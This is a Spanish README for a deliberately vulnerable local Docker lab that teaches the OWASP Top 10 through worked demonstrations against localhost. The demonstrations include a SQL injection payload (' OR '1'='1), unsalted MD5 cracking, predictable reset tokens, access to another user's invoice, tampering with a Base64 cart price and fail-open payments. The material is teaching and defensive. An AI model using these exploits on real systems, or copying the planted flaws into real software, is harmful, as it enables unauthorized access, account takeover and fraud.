# Demostraciones reproducibles

Inicia con `docker compose up --build -d --wait`. Puedes ejecutar todos los ejercicios desde http://localhost:18080 o con `docker compose exec lab java -cp /app/owasp-lab.jar mx.demo.owasp.SmokeCheck`. Los comandos siguientes están escritos para **PowerShell** y usan `curl.exe` para evitar el alias `curl` de Windows PowerShell. En Linux/macOS, usa `curl` en su lugar; los pasos que usan objetos PowerShell se pueden sustituir por la página interactiva.

Los cuerpos POST usan `application/x-www-form-urlencoded`. Reinicia con `docker compose restart lab` para restablecer el laboratorio. Solo ejecuta estas peticiones contra tu propia instancia local.

## A01 — Pérdida de control de acceso

**Código:** `LabServer.invoice` y `currentUser`. La sesión identifica al usuario, pero no se compara con el propietario de la factura.

```powershell
$session = Invoke-RestMethod -Method Post http://localhost:18080/api/login -Body @{user='alice'; password='demo123'}
curl.exe -H "Authorization: Bearer $($session.token)" "http://localhost:18080/api/a01/invoice?id=1001"
curl.exe -H "Authorization: Bearer $($session.token)" "http://localhost:18080/api/a01/invoice?id=1002"
```

**Resultado:** la primera factura pertenece a Alice; la segunda devuelve `owner: bob` y `viewer: alice`, HTTP 200, incluyendo domicilio ficticio. Sin sesión devuelve 401. El fallo es autorización por objeto, aun con autenticación válida.

## A02 — Configuración de seguridad incorrecta

**Código:** `LabServer.debug`. Una ruta de diagnóstico permanece habilitada y accesible sin autenticación.

```powershell
curl.exe -i http://localhost:18080/api/a02/debug
curl.exe -d "user=admin&password=admin123" http://localhost:18080/api/login
```

**Resultado:** configuración interna, `DEMO-NOT-A-REAL-SECRET` y credenciales administrativas ficticias en texto claro; el acceso posterior funciona. La respuesta de diagnóstico además lleva CORS `*`. No se exponen variables de entorno ni credenciales del equipo anfitrión.

## A03 — Fallas en la cadena de suministro de software

**Código:** `SupplyChain.quote`, `fixtures/trusted/vendor/PriceRule.java`, `fixtures/compromised/vendor/PriceRule.java` y generación de artefactos en `pom.xml`.

```powershell
curl.exe -d "channel=trusted" http://localhost:18080/api/a03/update
curl.exe -d "channel=compromised" http://localhost:18080/api/a03/update
```

**Resultado:** `chargedPrice` pasa de 1000 a 1. Maven compila dos versiones de un JAR de proveedor. El cargador ejecuta `vendor.PriceRule.apply` sin comprobar firma ni procedencia. El selector representa qué actualización entrega el proveedor; no hace falta explotar una CVE real ni instalar malware.

Cada petición carga su propio artefacto y aplica la regla inmediatamente; no cambia permanentemente la siguiente petición. Los únicos canales permitidos son los dos fixtures locales. La falta de control del proceso de actualización es el foco A03; la integridad también se relaciona con A08.

## A04 — Fallas criptográficas

**Código:** `LabState.md5` y almacenamiento `passwordHashes`. El endpoint de hashes facilita observar un volcado ficticio; el fallo criptográfico es MD5 sin salt.

```powershell
$dump = Invoke-RestMethod http://localhost:18080/api/a04/hashes
$dump | ConvertTo-Json
$md5 = [System.Security.Cryptography.MD5]::Create()
try {
  foreach ($word in @('password', 'demo123', 'welcome')) {
    $hash = -join ($md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($word)) | ForEach-Object { $_.ToString('x2') })
    if ($hash -eq $dump.hashes.alice) { "Contraseña recuperada: $word" }
  }
} finally { $md5.Dispose() }
```

**Resultado:** recupera `demo123` de un diccionario de tres entradas. Alice y Bob tienen el mismo hash antes de A07. Después del restablecimiento de Bob sus hashes serán distintos. No se requiere un ataque de colisiones: la velocidad de MD5 y la falta de salt permiten probar contraseñas fácilmente.

## A05 — Inyección

**Código:** `LabServer.customers`. SQL real ejecutado por H2, construido por concatenación.

```powershell
curl.exe -G --data-urlencode "name=Alice" http://localhost:18080/api/a05/customers
curl.exe -G --data-urlencode "name=' OR '1'='1" http://localhost:18080/api/a05/customers
```

**Resultado:** `count` pasa de 1 a 3; se leen notas ficticias de Bob y Admin. La consulta vulnerable resultante es:

```sql
SELECT id, name, private_note FROM customers WHERE name = '' OR '1'='1'
```

Si pruebas SQL destructivo adicional podrías modificar la base en memoria; reiniciar restaura los datos.

## A06 — Diseño inseguro

**Código:** `LabServer.redeem`. Regla de negocio: `WELCOME10` debe otorgar diez pesos solo una vez a la billetera de demostración. No existe registro de canjes.

```powershell
curl.exe http://localhost:18080/api/a06/wallet
curl.exe -d "coupon=WELCOME10" http://localhost:18080/api/a06/redeem
curl.exe -d "coupon=WELCOME10" http://localhost:18080/api/a06/redeem
```

**Resultado inicial:** saldo 100 → 110 → 120. No se necesita una carrera: repetir secuencialmente ya viola la regla. El identificador del cupón es válido; falta diseñar el control del ciclo de vida del canje.

## A07 — Fallas de autenticación

**Código:** `LabServer.resetPassword`. Token de recuperación derivado directamente del usuario.

```powershell
curl.exe -d "user=bob&token=reset-bob&password=taken123" http://localhost:18080/api/a07/reset
curl.exe -d "user=bob&password=taken123" http://localhost:18080/api/login
```

**Resultado:** restablecimiento y login HTTP 200 sin haber acreditado acceso al correo ni a la cuenta de Bob. `reset-bob` se puede reutilizar y no caduca. La contraseña anterior deja de funcionar. Restablece el estado al terminar si quieres repetir otras prácticas desde cero.

## A08 — Fallas en la integridad del software o de los datos

**Código:** `LabServer.checkout`. El carrito codificado en Base64 incluye el precio, sin firma ni validación contra catálogo.

```powershell
$original = Invoke-RestMethod http://localhost:18080/api/a08/cart
Invoke-RestMethod -Method Post http://localhost:18080/api/a08/checkout -Body @{cart=$original.cart}
$cart = '{"sku":"LAPTOP-DEMO","quantity":1,"unitPrice":1}'
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($cart))
Invoke-RestMethod -Method Post http://localhost:18080/api/a08/checkout -Body @{cart=$encoded}
```

**Resultado:** `charged` pasa de 1000 a 1 y `integrityVerified` es falso. Base64 solo codifica; no protege la integridad. A diferencia de A03, aquí se manipulan datos de una transacción y no un componente de software.

## A09 — Fallas en registro y alertas de seguridad

**Código:** `LabServer.login` con `silent=true`. Se cuentan fallos para observarlos en clase, pero no se registra usuario, instante, origen, resultado ni correlación; no hay emisor de alertas.

```powershell
1..8 | ForEach-Object { curl.exe -s -d "user=admin&password=wrong" http://localhost:18080/api/a09/login }
curl.exe http://localhost:18080/api/a09/telemetry
docker compose logs lab
```

**Resultado:** todos los intentos fallan con 401; `observedFailures` aumenta ocho, `securityEvents` y `alerts` permanecen vacíos. En los logs solo aparece el mensaje de inicio, no los fallos de autenticación. Los arreglos vacíos son la representación didáctica de los sistemas de auditoría/alertas ausentes, no una consulta a un SIEM real. La evidencia incluye revisar la ausencia de escritura de eventos en el método.

El acceso con contraseña correcta aún funciona. El foco de este ejercicio es detectar y alertar, aunque la ausencia de límites de intentos también se relaciona con A07.

## A10 — Manejo inadecuado de condiciones excepcionales

**Código:** `LabServer.pay`. Se aprueba por defecto cuando el servicio antifraude lanza una excepción.

```powershell
curl.exe -i -d "amount=1000&riskService=online" http://localhost:18080/api/a10/pay
curl.exe -i -d "amount=1000&riskService=offline" http://localhost:18080/api/a10/pay
```

**Resultado:** el primero devuelve 403 y `risk-rejected`; el segundo 200, `approved: true`, `reason: fail-open` y aumenta `completedOrders`. La condición `offline` es una inyección controlada de fallos del laboratorio. No contacta servicios externos ni cobra dinero.

## Restablecer y corregir

```sh
docker compose restart lab
```

Continúa con [MITIGACIONES.md](../MITIGACIONES.md). Los ejemplos son cambios propuestos; la versión entregada mantiene las fallas para poder enseñarlas. No existe una opción de configuración que convierta este laboratorio en una aplicación apta para producción.
